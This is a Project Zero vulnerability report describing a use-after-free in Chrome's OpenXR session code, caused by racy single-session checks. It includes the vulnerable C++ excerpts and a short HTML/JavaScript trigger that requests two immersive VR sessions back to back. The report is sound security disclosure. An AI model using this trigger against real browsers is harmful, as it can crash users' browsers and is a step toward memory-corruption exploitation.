<b>VULNERABILITY DETAILS</b>
```
XrResult OpenXrApiWrapper::InitSession(
    const std::unordered_set<mojom::XRSessionFeature>& enabled_features,
    OpenXrGraphicsBinding* graphics_binding,
    const OpenXrExtensionHelper& extension_helper,
    SessionStartedCallback on_session_started_callback,
    SessionEndedCallback on_session_ended_callback,
    VisibilityChangedCallback visibility_changed_callback) {
[...]
  if (extension_helper.ExtensionEnumeration()->ExtensionSupported(
          XR_MSFT_UNBOUNDED_REFERENCE_SPACE_EXTENSION_NAME)) {
    RETURN_IF_XR_FAILED(
        CreateSpace(XR_REFERENCE_SPACE_TYPE_UNBOUNDED_MSFT, &unbounded_space_));
  }
[...]
}
```

By the time `ExtensionEnumeration` is called, the `extension_helper` reference parameter might be dangling. The reference is extracted from the raw_ref member `OpenXrRenderLoop::extension_helper_`. The extension helper object is owned by the `OpenXrDevice` object, which should keep the helper alive for the entire lifetime of the render loop. However, if `OpenXrDevice::RequestSession` is called twice, the following line will cause the original helper to be destroyed.

```
void OpenXrDevice::RequestSession(
    mojom::XRRuntimeSessionOptionsPtr options,
    mojom::XRRuntime::RequestSessionCallback callback) {
[...]
  extension_helper_ = std::make_unique<OpenXrExtensionHelper>(instance_, platform_helper_->GetExtensionEnumeration());
[...]
}
```

There are renderer- and browser-side checks to ensure there's only one immersive XR session at any given time. Unfortunately, the checks are racy, and simply requesting two immersive VR sessions for different frames one right after the other will reliably trigger the issue.


<b>VERSION</b>
Google Chrome 114.0.5735.45 (Official Build)
Chromium 116.0.5806.0 (Developer Build)


<b>REPRODUCTION CASE</b>
The bug requires an attached VR headset. I used the Windows Mixed Reality Simulator to reproduce it.

```
<body>
<script>
h1 = document.body.appendChild(document.createElement("h1"));
h1.textContent = "Click me";

frame = document.body.appendChild(document.createElement("iframe"));
frame.style.opacity = 0;
  
onclick = _ => {
  h1.textContent = "Allow VR";
  navigator.xr.requestSession("immersive-vr").then(session => session.end()).then(_ => {
    frame.contentWindow.navigator.xr.requestSession("immersive-vr");
    navigator.xr.requestSession("immersive-vr");
  });
}
</script>
</body>
```


<b>CREDIT INFORMATION</b>
Sergei Glazunov of Google Project Zero


This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2023-08-30.
